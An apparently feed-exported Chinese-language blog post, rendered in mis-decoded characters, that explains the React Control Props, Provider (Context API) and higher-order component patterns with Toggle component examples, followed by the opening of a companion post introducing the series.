è‹¥åœ¨ React ä¸­æƒ³è¦å–å¾—ä½¿ç”¨è€…è¼¸å…¥é€²è¡¨å–®å…ƒä»¶çš„å€¼æ™‚ï¼Œä½ å°±æœƒæƒ³è¦å°‡ state ç¶å®šåœ¨å…ƒä»¶çš„ value ä¸Šé ­ï¼Œç„¶è€Œï¼Œä¸€ä½†ä½ å‚³å€¼çµ¦ valueï¼ˆä¹Ÿå°±æ˜¯ value=&#123;this.state.value&#125;ï¼‰ï¼Œä½ å°±å¿…é ˆè¦è‡ªå·±åˆ©ç”¨ handler å»æ§åˆ¶å®ƒçš„ç‹€æ…‹æ”¹è®Šï¼Œå¦å‰‡ä½¿ç”¨è€…å†æ€éº¼è¼¸å…¥ï¼Œéƒ½ä¸æœƒæ”¹è®Šå…¶ç‹€æ…‹ã€‚å› ç‚ºåœ¨ä½ å‚³å€¼çµ¦ value çš„æ™‚å€™ï¼Œé€™å€‹å…ƒä»¶å°±å·²ç¶“æ­¸ä½ æ§åˆ¶äº†ï¼Œé€™æ¨£çš„æ–¹å¼å¯ä»¥ä¿è­‰è©²å…ƒä»¶å…§éƒ¨ç‹€æ…‹æ˜¯ single source of truthï¼Œä¸æœƒæœ‰ä½¿ç”¨è€…çš„è¼¸å…¥èˆ‡ä½ çš„ state ä¸ä¸€è‡´çš„ç‹€æ…‹ç™¼ç”Ÿã€‚ï¼ˆé—œæ–¼ Controlled component åœ¨ React å®˜æ–¹ç¶²ç«™æœ‰è©³ç´°çš„ä»‹ç´¹ï¼‰
æ‰€ä»¥èªªï¼ŒControl Props å°±æ˜¯æƒ³åˆ©ç”¨é€™æ¨£çš„æŠ€å·§ï¼Œè®“ä½ çš„å…ƒä»¶åœ¨è®“ä½¿ç”¨è€…è‡ªè¡Œæ“ä½œ input æ™‚ï¼Œèƒ½ç¢ºä¿å…ƒä»¶å…§éƒ¨ç‹€æ…‹çš„ single source of truthã€‚é€éé€™ç¨®æ–¹å¼ï¼Œä¹Ÿå°±èƒ½å¤ å¾ä½¿ç”¨è€…è§’åº¦ä¾†åŒæ­¥å¤šå€‹å…ƒä»¶çš„å…§éƒ¨ç‹€æ…‹ã€‚
ä¸€æ¨£å·²å…ˆå‰çš„ Toggle å…ƒä»¶ä¾†èˆ‰ä¾‹ï¼Œä½†é€™æ¬¡æˆ‘å€‘ç”¨å€‹ç°¡åŒ–ç‰ˆï¼š
å‡è¨­ä»Šå¤©ä½¿ç”¨è€…æƒ³åŒæ­¥å…©å€‹å…ƒä»¶çš„ç‹€æ…‹ï¼Œä»–å€‘å¯ä»¥é€éæœ¬èº«çš„ State ä¾†æ§åˆ¶ï¼Œä¸¦åœ¨ onToggle æ™‚ä¾†æ›´å‹• Stateï¼š
class App extends React.Component &#123;  state = &#123; bothOn: false &#125;;  handleToggle = on =&gt; &#123;    this.setState(&#123; bothOn: on &#125;);  &#125;;  render() &#123;    return (      &lt;div className=&quot;App&quot;&gt;        &lt;Toggle on=&#123;this.state.bothOn&#125; onToggle=&#123;this.handleToggle&#125;&gt;           &#123;(&#123; on, toggle &#125;) =&gt; (            &lt;div&gt;              &#123;on ? &quot;The button is on&quot; : &quot;The button is off&quot;&#125;              &lt;hr /&gt;              &lt;button className=&quot;button1&quot; onClick=&#123;toggle&#125;&gt;                &#123;on ? &quot;click on&quot; : &quot;click off&quot;&#125;              &lt;/button&gt;              &lt;hr /&gt;            &lt;/div&gt;          )&#125;        &lt;/Toggle&gt;        &lt;Toggle on=&#123;this.state.bothOn&#125; onToggle=&#123;this.handleToggle&#125;&gt;          &#123;(&#123; on, toggle &#125;) =&gt; (            // same render props as above          )&#125;        &lt;/Toggle&gt;      &lt;/div&gt;    );  &#125;&#125;

ä½†è¦è¨˜å¾—ï¼ŒonToggle å¯¦éš›ä¸Šæ˜¯ Toggle å…ƒä»¶å…§éƒ¨åŸ·è¡Œå®Œ toggle å¾Œæ‰æœƒåŸ·è¡Œçš„å‹•ä½œï¼ˆå‘ŠçŸ¥ä½¿ç”¨è€…è©²å…ƒä»¶â€è¢«â€ Toggle äº†ï¼‰ï¼Œé€™æ¨£çš„è©±ï¼Œå…ƒä»¶è¦æ€éº¼ä¾ç…§å‚³å…¥çš„ Props ä¾†è™•ç†å…§éƒ¨ç‹€æ…‹å‘¢ï¼Ÿ
ä¾†çœ‹ä¸€ä¸‹æˆ‘å€‘ Toggle çš„å¯¦ä½œï¼š
class Toggle extends React.Component &#123;  state = &#123; on: false &#125;;  isControlled(prop) &#123;    return this.props[prop] !== undefined;  &#125;  getState() &#123;    return Object.entries(this.state).reduce((combinedState, [key, value]) =&gt; &#123;      if (this.isControlled(key)) &#123;        combinedState[key] = this.props[key];      &#125; else &#123;        combinedState[key] = value;      &#125;      return combinedState;    &#125;, &#123;&#125;);  &#125;  toggle = () =&gt; &#123;    if (this.isControlled(&quot;on&quot;)) &#123;      this.props.onToggle(!this.getState().on);    &#125; else &#123;      this.setState(        (&#123; on &#125;) =&gt; (&#123; on: !on &#125;),        () =&gt; &#123;          this.props.onToggle(this.getState().on);        &#125;      );    &#125;  &#125;;  render() &#123;    return this.props.children(&#123; ...this.getState(), toggle: this.toggle &#125;);  &#125;&#125;

ä¸»è¦é‡é»åœ¨æ–¼ï¼Œæ¯æ¬¡ toggle è¢« trigger æ™‚ï¼Œæˆ‘å€‘éƒ½æœƒå…ˆå»ç¢ºèªä¸€ä¸‹ on é€™å€‹ state æœ‰æ²’æœ‰è¢«ä½¿ç”¨è€… Controlledï¼ˆisControlled()ï¼‰ï¼Œè‹¥æ˜¯ä½¿ç”¨è€…æœ‰é€é propsï¼ˆä½¿ç”¨è€…ç«¯ï¼‰å‚³å€¼çµ¦é€™å€‹ stateï¼ˆå…ƒä»¶å…§éƒ¨ï¼‰ï¼Œå°±ä»£è¡¨æˆ‘å€‘å¾—å°‡è©² state çš„æŒæ§äº¤çµ¦ä½¿ç”¨è€…ã€‚
ä»€éº¼å«ã€äº¤çµ¦ä½¿ç”¨è€…ã€å‘¢ï¼Ÿ
å…¶å¯¦ä¹Ÿå°±æ˜¯è¦å°‡ä½¿ç”¨è€…å‚³å…¥çš„ props èˆ‡æˆ‘å€‘è‡ªå·±æœ¬èº«çš„ state åš combinationï¼Œä¸¦å°‡çµæœç•¶ä½œå…ƒä»¶å¯¦éš›çš„ state ä¾†ä½¿ç”¨ï¼Œå¦‚åŒä¸Šè¿°ç¨‹å¼ç¢¼ä¸­çš„ getState() å‡½æ•¸ã€‚ä¹‹å¾Œå…ƒä»¶æ‰€æœ‰éœ€è¦æ“ä½œ state çš„åœ°æ–¹éƒ½éœ€è¦é€éè©²å‡½æ•¸ä¾†å–å¾—å…ƒä»¶çš„ Current Stateã€‚
å¦‚æ­¤ä¸€ä¾†ï¼Œåªè¦ä½¿ç”¨è€…æœ‰å‚³å…¥ on é€™å€‹ propsï¼Œå…ƒä»¶å…§éƒ¨é—œæ–¼ on é€™å€‹ state çš„è®ŠåŒ–ï¼Œå°±æœƒåƒæ˜¯ç”±ä½¿ç”¨è€…æœ¬èº«æ“æ§ä¸€èˆ¬ï¼ˆå› ç‚ºæˆ‘å€‘åœ¨æ¯æ¬¡å–å¾— current state æ™‚éƒ½æœƒ merge props ä¸­å°æ‡‰çš„å€¼ï¼‰ï¼Œä¹Ÿå°±èƒ½è®“ä½¿ç”¨è€…åŒæ­¥å¤šå€‹ Toggle component äº†ï¼
Control Props ç”¨æ–‡å­—æ•˜è¿°æ¯”è¼ƒç¹ç‘£é›£æ‡‚ï¼Œå¯ä»¥åˆ°ä¸‹é¢çš„ demo link ç©ç©ï¼Œè©¦è‘—æŠŠ Toggle component çš„ on props æ‹¿æ‰çœ‹çœ‹å·®åˆ¥ï¼Œæ‹¿æ‰ props å¾Œï¼Œå…©å€‹å…ƒä»¶çš„ç‹€æ…‹å°±ç„¡æ³•åŒæ­¥ï¼Œä½†å…ƒä»¶æœ¬èº«çš„ç‹€æ…‹é‚„æ˜¯æ­£å¸¸çš„ã€‚demo link
åœ¨ Kent C. Dodds çš„ workshop ä¸­ï¼Œä»–å…¶å¯¦é‚„æœ‰ä»‹ç´¹å¦‚ä½•æ•´åˆå…ˆå‰çš„ State Reducer èˆ‡ Control Propsï¼Œä¸éæˆ‘è¦ºå¾—éæ–¼è¤‡é›œï¼Œé™¤äº†å¾ˆé›£å…‰ç”¨æ–‡å­—æ•˜è¿°å¤–ï¼Œå¯¦éš›ä½¿ç”¨çš„æ©Ÿæœƒæ„Ÿè¦ºä¹Ÿä¸å¤§ï¼Œå¦‚æœæœ‰èˆˆè¶£çš„è®€è€…å¯ä»¥ç›´æ¥å» codesandbox ä¸Šçœ‹ç¯„ä¾‹(file 10.js)
ProviderProvider pattern å…¶å¯¦æ˜¯ç‚ºäº†è§£æ±º Props drilling çš„å•é¡Œï¼Œä»€éº¼æ˜¯ Props drilling å‘¢ï¼Ÿ
èˆ‰å€‹ç°¡å–®ä¾‹å­ï¼š
class Toggle extends React.Component &#123;  state = &#123; on: false &#125;;  toggle = () =&gt; &#123; /*...*/ &#125;;  render() &#123;    return this.props.children(&#123; ...this.state, toggle: this.toggle &#125;);  &#125;&#125;const Layer1 = (&#123;toggle, ...props&#125;) =&gt; &lt;Layer2 toggle=&#123;toggle&#125; /&gt;const Layer2 = (&#123;toggle, ...props&#125;) =&gt; &lt;Layer3 toggle=&#123;toggle&#125; /&gt;const Layer3 = (&#123;toggle, ...props&#125;) =&gt; &lt;button onClick=&#123;toggle&#125; /&gt;class App extends React.Component &#123;  handleToggle = () =&gt; &#123;&#125;;  render() &#123;    return (      &lt;Toggle onToggle=&#123;this.handleToggle&#125;&gt;        &lt;Layer1 /&gt;      &lt;/Toggle&gt;    );  &#125;&#125;

æˆ‘çŸ¥é“é€™æ®µ code å¾ˆå¥‡æ€ªï¼Œä½†é€™è£¡æƒ³å‘ˆç¾çš„é‡é»æ˜¯ï¼Œæœ‰äº›æ™‚å€™æˆ‘å€‘å¯èƒ½çœŸçš„æƒ³è¦æŠŠæŸå€‹å¤–å±¤çš„ props å¾€ä¸‹å‚³éçµ¦åº•ä¸‹çš„ componentï¼Œé€™ç¨®æƒ…æ³ä¸‹å¯èƒ½å¾—ä¸€å±¤ä¸€å±¤å°‡ props å¾€ä¸‹å¸¶ï¼Œå³ä¾¿ä¸­é–“ç¶“éçš„ component éƒ½ä¸éœ€è¦ç”¨åˆ°è©² propsã€‚
è¦è§£æ±ºé€™æ¨£çš„å•é¡Œï¼Œå¯ä»¥åˆ©ç”¨ React çš„ Context APIã€‚
é›–ç„¶åœ¨ React 16 ä»¥å‰ï¼ŒContext API åœ¨å®˜æ–¹æ–‡ä»¶æ˜¯ä¸€ç›´è™•æ–¼ä¸€ç¨®ä¸æ¨è–¦ä½¿ç”¨çš„ç‹€æ…‹ï¼Œä½†å¤§æ¦‚å› ç‚ºå¤ªå¤šäººéœ€è¦å§ï¼ˆåƒæ˜¯ redux ç­‰ state management å…¶å¯¦éƒ½æœ‰ç”¨åˆ°ï¼‰ï¼Œç¾åœ¨æœ‰äº†æ–°çš„å¯¦ä½œï¼Œè®“æˆ‘å€‘çµ‚æ–¼å¯ä»¥æ”¾å¿ƒä½¿ç”¨ Context API äº†ï¼Œå› æ­¤é€™é‚Šè¦ä»‹ç´¹çš„ Provider patternï¼Œå…¶å¯¦å°±æ˜¯åˆ©ç”¨ React æœ€æ–°çš„ Context API ä¾†è§£æ±º Props drilling å•é¡Œï¼
æ—©åœ¨ä¸Šç¯‡ä¸­ä»‹ç´¹çš„ Compound component æˆ‘å€‘å°±æœ‰ç”¨åˆ° Provider pattern äº†ï¼Œè€Œç¾åœ¨å°±è®“æˆ‘å€‘ç”¨å‰›å‰›é‚£å€‹é›¢å¥‡çš„ä¾‹å­ä¾†åšé»ä¿®æ­£å§ï¼š
const ToggleContext = React.createContext();class Toggle extends React.Component &#123;  static Consumer = ToggleContext.Consumer;  toggle = () =&gt; this.setState((&#123; on &#125;) =&gt; (&#123; on: !on &#125;));  state = &#123; on: false, toggle: this.toggle &#125;;  render() &#123;    const &#123; children, ...rest &#125; = this.props;    const ui = typeof children === &quot;function&quot; ? children(this.state) : children;    return (      &lt;ToggleContext.Provider value=&#123;this.state&#125; &#123;...rest&#125;&gt;        &#123;ui&#125;      &lt;/ToggleContext.Provider&gt;    );  &#125;&#125;

åˆ©ç”¨ React 16 å¾Œå‡ºç¾çš„ React.createContext()ï¼Œå‰µé€ ä¸€å€‹ ToggleContextï¼Œä¸¦å°‡å…¶æä¾›çš„ Consumer ç•¶ä½œ static è®Šæ•¸æ”¾åœ¨ Toggle ä¸­ã€‚
æ¥è‘—åœ¨ render function ä¸­æˆ‘å€‘ä½¿ç”¨ Context API æä¾›çš„å¦ä¸€å€‹ component Providerï¼Œå°‡å‚³å…¥ Toggle çš„ render props åŒ…è£¹ä½ï¼Œä¸¦ä¸”å°‡ Toggle æœ¬èº«çš„ state æˆ– function å‚³åˆ° value é€™å€‹ props ä¸­ã€‚å¦‚æ­¤ä¸€ä¾†ï¼ŒToggle åº•ä¸‹çš„æ‰€æœ‰ children ä¹‹å¾Œåªè¦å°‡è‡ªå·±ç”¨ Toggle.Consumer åŒ…ä½å°±å¯ä»¥è‡ªç”±å­˜å– Toggle å‚³ä¸‹ä¾†çš„ valueï¼š
const Layer1 = () =&gt; &lt;Layer2 /&gt;;const Layer2 = () =&gt; &lt;Layer3 /&gt;;const Layer3 = () =&gt; (  &lt;Toggle.Consumer&gt;    &#123;(&#123; on, toggle &#125;) =&gt; (      &lt;Fragment&gt;        &lt;div&gt;&#123;on ? &quot;The button is on&quot; : &quot;The button is off&quot;&#125;&lt;/div&gt;        &lt;button className=&quot;button1&quot; onClick=&#123;toggle&#125;&gt;          &#123;on ? &quot;click on&quot; : &quot;click off&quot;&#125;        &lt;/button&gt;      &lt;/Fragment&gt;    )&#125;  &lt;/Toggle.Consumer&gt;);class App extends React.Component &#123;  render() &#123;    return (      &lt;div className=&quot;App&quot;&gt;        &lt;Toggle&gt;          &lt;Layer1 /&gt;        &lt;/Toggle&gt;      &lt;/div&gt;    );  &#125;&#125;

ç”±ä¸Šé¢çš„ç¨‹å¼ç¢¼å¯ä»¥çœ‹åˆ°ï¼ŒToggle component çš„ state èˆ‡ toggle function éƒ½æœƒè¢«ç•¶æˆ props å‚³çµ¦è¢« Toggle.Consumer åŒ…è£¹è‘—çš„ childrenã€‚
åŒ…åœ¨ç¬¬ä¸‰å±¤çš„ &lt;Layer3 /&gt; å°±å¯ä»¥ç›´æ¥æ‹¿åˆ°æƒ³è¦çš„ on èˆ‡ toggleï¼Œå†ä¹Ÿä¸ç”¨å¾ Layer1 å‚³åˆ° Layer2 å†å‚³åˆ° Layer3 äº†ï¼
Demo Link
Higher-order componentæœ€å¾Œä¸€å€‹ Pattern æˆ‘æƒ³æ˜¯å¤§å®¶æœ€ç†Ÿæ‚‰ï¼Œä¹Ÿæ˜¯æˆ‘èªç‚ºæœ€éœ€è¦æ‡‚å¾—èæœƒè²«é€šçš„ Higher-order componentï¼Œé€šå¸¸ç°¡ç¨± HOCã€‚æ—¨åœ¨è§£æ±º Cross-Cutting Concernsï¼Œèªªç™½ä¸€é»å°±æ˜¯è®“ä½ å°‡ä¸€äº›å¯å…±ç”¨çš„é‚è¼¯æŠ½å–å‡ºä¾†ï¼Œè®“å…¶ä»–å…ƒä»¶é€é HOC çš„åŒ…è£å¾Œï¼Œèƒ½ç²å¾—è©²å…±ç”¨åŠŸèƒ½ï¼Œä¹‹å¾Œä¿®æ”¹æ–°å¢æ™‚ä¸æœƒå› ç‚ºé‚è¼¯è·Ÿå…ƒä»¶ç¶å¤ªç·Šè€Œå‡ºç¾å•é¡Œã€‚
é›–ç„¶å¾ˆé‡è¦ï¼Œä½†é€™å€‹ Pattern ç›¸å°ç°¡å–®ï¼ŒReact å®˜ç¶²å…¶å¯¦å°±æœ‰éå¸¸è©³ç´°çš„ä»‹ç´¹ã€‚é€™é‚Šå°±ç°¡å–®ä»‹ç´¹å°±å¥½ï¼Œå…ˆä¾†å€‹ç¯„ä¾‹å§ï¼š
const Layer1 = () =&gt; &lt;Layer2 /&gt;;const Layer2 = () =&gt; &lt;Layer3 /&gt;;const Layer3 = withToggle((&#123;contextProps: &#123; on, toggle &#125;&#125;) =&gt; (  &lt;Fragment&gt;    &lt;div&gt;&#123;on ? &quot;The button is on&quot; : &quot;The button is off&quot;&#125;&lt;/div&gt;    &lt;button className=&quot;button1&quot; onClick=&#123;toggle&#125;&gt;      &#123;on ? &quot;click on&quot; : &quot;click off&quot;&#125;    &lt;/button&gt;  &lt;/Fragment&gt;));const Layer4 = withToggle((&#123;contextProps: &#123; on, toggle &#125;&#125;) =&gt; (  &lt;Fragment&gt;    &lt;div&gt;      &lt;button className=&quot;button2&quot; onClick=&#123;toggle&#125;&gt;        &#123;on ? &quot;click on&quot; : &quot;click off&quot;&#125;      &lt;/button&gt;    &lt;/div&gt;    &lt;div&gt;&#123;on ? &quot;The button2 is on&quot; : &quot;The button2 is off&quot;&#125;&lt;/div&gt;  &lt;/Fragment&gt;));class App extends React.Component &#123;  render() &#123;    return (      &lt;div className=&quot;App&quot;&gt;        &lt;Toggle&gt;          &lt;Layer1 /&gt;          &lt;Layer4 /&gt;        &lt;/Toggle&gt;      &lt;/div&gt;    );  &#125;&#125;

é€™å€‹ç¯„ä¾‹å»¶çºŒå‰ä¸€å€‹ Provider patternï¼Œæˆ‘å€‘å°‡ Toggle.Consumer æŠ½å‡ºä¾†ï¼ŒåŒ…è£æˆä¸€å€‹ HOC withToggleï¼Œé€™æ¨£ä¸€ä¾†ï¼Œæˆ‘å€‘å¯ä»¥è¼•é¬†è£½é€ å‡ºå¤šå€‹æ“æœ‰ Toggle component åŠŸèƒ½èˆ‡ç‹€æ…‹çš„å…ƒä»¶ï¼Œåƒæ˜¯é€™é‚Šçš„ Layer3 èˆ‡ Layer4ï¼Œä»–å€‘åªéœ€è¦ care è‡ªå·±çš„ UI é‚è¼¯å³å¯ï¼Œå‰©ä¸‹èˆ‡ Toggle ç›¸é—œçš„ç‹€æ…‹æ“ä½œéƒ½äº¤ç”± withToggle é€™å€‹ HOC å¹«å¿™è™•ç†ã€‚
è€Œ withToggle é•·é€™æ¨£ï¼š
function withToggle(Component) &#123;  function Wrapper(props, ref) &#123;    return (      &lt;Toggle.Consumer&gt;        &#123;toggleContext =&gt; (          &lt;Component contextProps=&#123;toggleContext&#125; &#123;...props&#125; ref=&#123;ref&#125; /&gt;        )&#125;      &lt;/Toggle.Consumer&gt;    );  &#125;  Wrapper.displayName = `withToggle($&#123;Component.displayName ||    Component.name&#125;)`;  return hoistNonReactStatics(React.forwardRef(Wrapper), Component);&#125;

æ˜¯ä¸æ˜¯å¾ˆç°¡å–®å‘¢ï¼
HOC è² è²¬ä¸»è¦çš„å…±ç”¨é‚è¼¯ï¼Œåœ¨é€™é‚Šå°±æ˜¯ Toggle.Consumer é€™æ®µï¼Œç„¶å¾Œå°‡å‚³å…¥çš„ Component å¡å…¥ï¼Œå¯èƒ½æ˜¯æ”¾åœ¨ render æˆ–æ˜¯åƒé€™é‚Šæ˜¯å‚³å…¥ Consumer çš„ childrenã€‚
ç‰¹åˆ¥è¦æ³¨æ„çš„æœ‰ä¸‰é»ï¼Œä¸€å€‹æ˜¯ displayNameï¼Œç”±æ–¼ HOC æœƒå›å‚³ä¸€å€‹æ–°çš„ Componentï¼Œé€™æ™‚å¦‚æœä½ æ²’æœ‰æ˜ç¢ºå®šç¾©ä¸€å€‹ displayName çš„è©±ï¼Œåœ¨ Dev tool è£¡ä½ å°±åªèƒ½çœ‹åˆ°ä¸€å€‹ Unknown çš„å…ƒä»¶ï¼Œæœƒé€ æˆé–‹ç™¼ä¸Šçš„å›°æ“¾ï¼Œæ‰€ä»¥è¨˜å¾—è¦æŒ‡å®šä¸€ä¸‹ displayNameï¼Œé€šå¸¸æœƒç”¨ HOC è‡ªå·±çš„åç¨±åŠ ä¸ŠåŸæœ‰ Component çš„ displayNameã€‚
å¦ä¸€å€‹è¦æ³¨æ„çš„é»æ˜¯ forwardRefï¼Œåœ¨ React ä¸­ï¼Œref èˆ‡ props çš„è™•ç†æ–¹å¼ä¸ç›¸åŒï¼Œref ä¸¦ä¸æœƒå¦‚åŒ props ä¸€èˆ¬å¾€ä¸‹å‚³éï¼Œè‹¥ä½ æƒ³è¦å–å¾—è¢« HOC åŒ…è£¹éçš„ component çš„ refï¼Œé‚£åœ¨ä½ çš„ HOC ä¸­ï¼Œå¿…é ˆä½¿ç”¨ React.forwardRef å°‡å…¶ forward ä¸‹å»ï¼Œè©³ç´°ä»‹ç´¹å¯ä»¥çœ‹å®˜ç¶²èªªæ˜ã€‚
æœ€å¾Œï¼Œå‡å¦‚ä½ åŸå…ˆçš„ component æœ‰ä¸€äº› static methodï¼Œé€é HOC åŒ…è£å¾Œï¼Œä½ å¯èƒ½æœƒç™¼ç¾é‚£äº› static method éƒ½å–ä¸åˆ°äº†ï¼
ä½ å¿…é ˆè¦åœ¨ HOC ä¸­è‡ªè¡Œè¤‡è£½ä¸€ä»½åˆ° HOC ä¸Šé ­ï¼Œåƒé€™æ¨£ï¼ˆå–è‡ª React å®˜ç¶²)ï¼š
function enhance(WrappedComponent) &#123;  class Enhance extends React.Component &#123;/*...*/&#125;  // Must know exactly which method(s) to copy :(  Enhance.staticMethod = WrappedComponent.staticMethod;  return Enhance;&#125;

ä½†é€™æ¨£å¤ªéº»ç…©äº†ï¼Œæˆ‘å€‘å¯ä»¥ç›´æ¥åˆ©ç”¨ hoistNonReactStatics é€™å¥— lib ä¾†å¹«å¿™ï¼Œé€™æ¨£å°±è¬ç„¡ä¸€å¤±äº†ï¼
import hoistNonReactStatic from &#x27;hoist-non-react-statics&#x27;;function enhance(WrappedComponent) &#123;  class Enhance extends React.Component &#123;/*...*/&#125;  hoistNonReactStatic(Enhance, WrappedComponent);  return Enhance;&#125;

Demo Link
çµè«–ä»‹ç´¹äº†é€™éº¼å¤šç¨® Patternï¼Œå…¶å¯¦æˆ‘è¦ºå¾— HOCã€Render Props èˆ‡ Compound Component æ˜¯æœ€éœ€è¦å¥½å¥½æŒæ¡ä¸¦ä¸”å¤šåŠ é‹ç”¨çš„ï¼Œå…¶ä»–å¦‚ State Reducerã€Prop Collections and Getters å‰‡æ˜¯å¹³å¸¸åœ¨é€²è¡Œ Code Review æ™‚ï¼Œå¯ä»¥å¥½å¥½æ‹¿å‡ºä¾†æ€è€ƒä¸€ä¸‹æ˜¯å¦èƒ½å¤ æ¡ç”¨ï¼Œç‚ºä½ çš„å°ˆæ¡ˆåŠ åˆ†ã€‚ç„¡è«–å¦‚ä½•ï¼Œç¶“éé€™æ¨£çš„å­¸ç¿’èˆ‡ç´€éŒ„ï¼Œè‡³å°‘è®“è‡ªå·±å¹³æ—¥é–‹ç™¼æ™‚ï¼Œèƒ½ä¸»å‹•å¤šæ€è€ƒä¸€äº›å„ªåŒ–çš„æ–¹å‘èˆ‡å¯èƒ½æ€§ï¼Œç¸½é«”æ˜¯è »æœ‰æ”¶ç©«çš„ï¼
æœ€å¾Œæä¾›å¤§å®¶ Kent C. Dodds åœ¨ workshop å¾Œè‡ªå·±å¯«çš„ä¸€ç¯‡æ–‡ç« ï¼ŒMixing Component Patternsï¼Œè£¡é ­ä»–å°‡é€™äº› pattern çµåˆåœ¨ä¸€èµ·ä½¿ç”¨ï¼Œæœ‰èˆˆè¶£çš„è®€è€…å¯ä»¥å»çœ‹çœ‹åˆ°åº•é€™éº¼å¤š Pattern è¦æ€éº¼èåˆä½¿ç”¨ã€‚
è¬è¬çœŸçš„æœ‰çœ‹åˆ°é€™é‚Šçš„å„ä½ï¼Œé€™äº›ç­†è¨˜æ–·æ–·çºŒçºŒçš„ç´€éŒ„ï¼Œä¸€ä¸å°å¿ƒå°±ç¯‡å¹…å¾ˆå¤šâ€¦è‹¥ç™¼ç¾ä¸­é–“æœ‰æ•˜è¿°ä¸é †æˆ–æ˜¯éŒ¯èª¤çš„åœ°æ–¹ï¼Œæ­¡è¿å¤§å®¶å‘ŠçŸ¥ï¼
è³‡æ–™ä¾†æº
Advanced React Patterns workshop
Advanced React Patterns V2 codesandbox
Advanced React Patterns Blog
Answers to common questions about render props
Do more with less using render props
React new context api
Mixing Component Patterns

é—œæ–¼ä½œè€…ï¼š@arvinh å‰ç«¯æ”»åŸç…ï¼Œç†±æ„›æ•¸æ“šåˆ†æå’Œè³‡è¨Šè¦–è¦ºåŒ–
]]></content>
      <tags>
        <tag>react</tag>
        <tag>es6</tag>
        <tag>javascript</tag>
        <tag>pattern</tag>
      </tags>
  </entry>
  <entry>
    <title>é€²éš React Component Patterns ç­†è¨˜ï¼ˆä¸Šï¼‰</title>
    <url>/2018/06/27/advanced-react-component-patterns-note/</url>
    <content><![CDATA[å‰è¨€å‰ä¸ä¹…åœ¨ Frontend masters çœ‹åˆ°ä¸€éƒ¨å½±ç‰‡ Advanced React Patternsï¼Œæ˜¯ Paypal çš„å·¥ç¨‹å¸« Kent C. Dodds åœ¨æŸå ´ workshop ä»‹ç´¹ä»–å¯¦ä½œ React component æ™‚æ‰€ä½¿ç”¨çš„é€²éš React Patternsï¼ˆç›®å‰ä¼¼ä¹è¦ä»˜è²»è§€çœ‹ï¼Œè€Œä»–åœ¨ egghead.io ä¸Šä¹Ÿæœ‰ä¸€ç³»åˆ—æ•™å­¸ï¼ŒåŒæ¨£è¦æ”¶è²»å°±æ˜¯äº†â€¦ï¼‰ï¼Œå…§å®¹éå¸¸è±å¯Œæ‰å¯¦ï¼Œè‹¥æ˜¯æƒ³æä¾›ä¸€äº›å¯é«˜åº¦å®¢è£½åŒ–çš„å…±ç”¨å…ƒä»¶ï¼Œä½¿ç”¨é€™äº› Pattern çµ•å°æ˜¯æœ‰çµ•ä½³çš„å¹«åŠ©ï¼å¦‚æœå¯ä»¥ï¼Œæˆ‘å¼·çƒˆå»ºè­°å¤§å®¶è‡ªå·±å»è½è½ï¼Œä¸ç”¨æŠŠæ™‚é–“èŠ±åœ¨é–±è®€æˆ‘çš„æ–‡å­—ä¸Š :p
è‡ªå¾çœ‹å®Œé‚£å½±ç‰‡å¾Œï¼Œå¹³å¸¸é–‹ç™¼éƒ½æœƒä¸è‡ªè¦ºå¾—å»æ€è€ƒé€™äº› patternï¼Œçœ‹çœ‹å¦‚æœæ‡‰ç”¨åˆ°æˆ‘ç›®å‰çš„å°ˆæ¡ˆä¸­ï¼Œèƒ½å¦å¸¶ä¾†ç›Šè™•ã€‚
ç•¶ç„¶æœ‰äº›æ—©å·²æœ‰åœ¨ä½¿ç”¨ï¼Œè€Œæœ‰äº›å‰‡è‹¦ç„¡ä¼¸å±•ä¹‹è™•ï¼Œç‚ºäº†åŠ æ·±è‡ªå·±å°é€™äº› pattern çš„å°è±¡èˆ‡ç†è§£ï¼Œä»Šå¤©å°±ä¾†ç­†è¨˜ä¸€ä¸‹é€™ç³»åˆ—å½±ç‰‡çš„å…§å®¹ï¼Œä¹Ÿå¸Œæœ›èƒ½å°ä¾†åˆ°é€™é‚Šçš„è®€è€…æœ‰æ‰€å¹«åŠ©ã€‚
ç‚ºä½•è¦æœ‰ Patternåœ¨é–‹å§‹ä»‹ç´¹ä¹‹å‰ï¼Œæˆ‘å…¶å¯¦æƒ³è¨è«–ä¸€ä¸‹ç‚ºä»€éº¼éœ€è¦æœ‰ Patternï¼Œæˆ–æ˜¯èªªï¼Œæˆ‘å€‘çœŸçš„éœ€è¦ Pattern å—ï¼Ÿ
æœƒæœ‰é€™æ¨£çš„ç–‘å•å…¶å¯¦æ˜¯åœ¨éå¾€ç¶“é©—ä¸­ï¼Œé‚„è »å¸¸ç™¼ç¾æ¡ç”¨ Design pattern çš„ç¨‹å¼ç¢¼å¦‚æœéœ€è¦ä¿®æ”¹æ™‚ï¼Œå°æ–¼ä¸ç†Ÿæ‚‰è©² Patternï¼Œæˆ–æ˜¯åŸä½œè€…é›–ç„¶æ¡ç”¨æŸç¨® Patternï¼Œä½†æ²’æœ‰å …æŒåˆ°åº•ï¼Œåœ¨ä¸€äº›åœ°æ–¹ç‚ºäº†æ–¹ä¾¿è€Œæ”¹æ¡å–åˆ¥ç¨®ä½œæ³•ï¼›æ›´æ…˜çš„æƒ…æ³æ˜¯ï¼Œåœ¨éŒ¯èª¤çš„æƒ…å¢ƒä¸‹ï¼Œæ¡ç”¨äº†ä¸é©åˆçš„ patternï¼Œé€™äº›æƒ…æ³éƒ½å®¹æ˜“é€ æˆç¶­è­·ä¸Šçš„æ¥µå¤§å›°æ“¾ã€‚
